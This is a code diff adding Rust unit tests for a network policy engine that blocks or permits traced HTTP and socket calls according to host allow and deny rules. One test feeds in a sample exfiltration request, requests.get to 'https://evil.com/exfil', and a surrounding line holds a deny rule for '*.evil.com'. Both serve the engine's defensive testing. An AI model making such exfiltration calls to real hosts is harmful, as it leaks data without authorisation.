@@ -792,6 +792,80 @@ mod tests {
     }
 
     #[test]
+    fn test_network_allow_blocks_python_http_to_unknown_host() {
+        // network: allow: ["huggingface.co/**"] — requests.get to evil.com should be blocked
+        let engine = PolicyEngine::from_yaml(
+            "version: 1\nnetwork:\n  allow:\n    - \"huggingface.co/**\"\n",
+        )
+        .unwrap();
+        let policy = ActivePolicy::new(engine);
+
+        let event = make_trace_event(
+            HookType::Python,
+            "requests.get",
+            &["url='https://evil.com/exfil'"],
+        );
+        let disp = policy.evaluate_trace(&event);
+        assert!(disp.is_blocked(), "non-allowed host should be blocked");
+    }
+
+    #[test]
+    fn test_network_allow_permits_python_http_to_allowed_host() {
+        let engine = PolicyEngine::from_yaml(
+            "version: 1\nnetwork:\n  allow:\n    - \"huggingface.co/**\"\n",
+        )
+        .unwrap();
+        let policy = ActivePolicy::new(engine);
+
+        let event = make_trace_event(
+            HookType::Python,
+            "requests.get",
+            &["url='https://huggingface.co/model'"],
+        );
+        let disp = policy.evaluate_trace(&event);
+        assert!(!disp.is_blocked(), "allowed host should pass through");
+    }
+
+    #[test]
+    fn test_network_allow_auto_generates_http_hooks() {
+        let engine = PolicyEngine::from_yaml(
+            "version: 1\nnetwork:\n  allow:\n    - \"huggingface.co/**\"\n",
+        )
+        .unwrap();
+        let policy = ActivePolicy::new(engine);
+
+        let configs = policy.derive_hook_configs(false);
+        let has_requests_get = configs
+            .iter()
+            .any(|c| c.hook_type == HookType::Python && c.symbol == "requests.get");
+        assert!(
+            has_requests_get,
+            "network: allow should auto-add requests.get hook"
+        );
+    }
+
+    #[test]
+    fn test_native_connect_ip_not_blocked_when_network_allow_exists() {
+        let engine = PolicyEngine::from_yaml(
+            "version: 1\nsymbols:\n  deny:\n    - connect\nnetwork:\n  allow:\n    - \"huggingface.co/**\"\n",
+        )
+        .unwrap();
+        let policy = ActivePolicy::new(engine);
+
+        let net = NetworkInfo {
+            host: Some("93.184.216.34".to_string()),
+            port: Some(443),
+            ..Default::default()
+        };
+        let event = make_trace_event_with_net(HookType::Native, "connect", &[], net);
+        let disp = policy.evaluate_trace(&event);
+        assert!(
+            !disp.is_blocked(),
+            "IP-only connect should not be blocked by hostname allow rules"
+        );
+    }
+
+    #[test]
     fn test_fallback_to_text_extraction_when_no_network_info() {
         let engine =
             PolicyEngine::from_yaml("version: 1\nnetwork:\n  deny:\n    - \"*.evil.com\"\n")
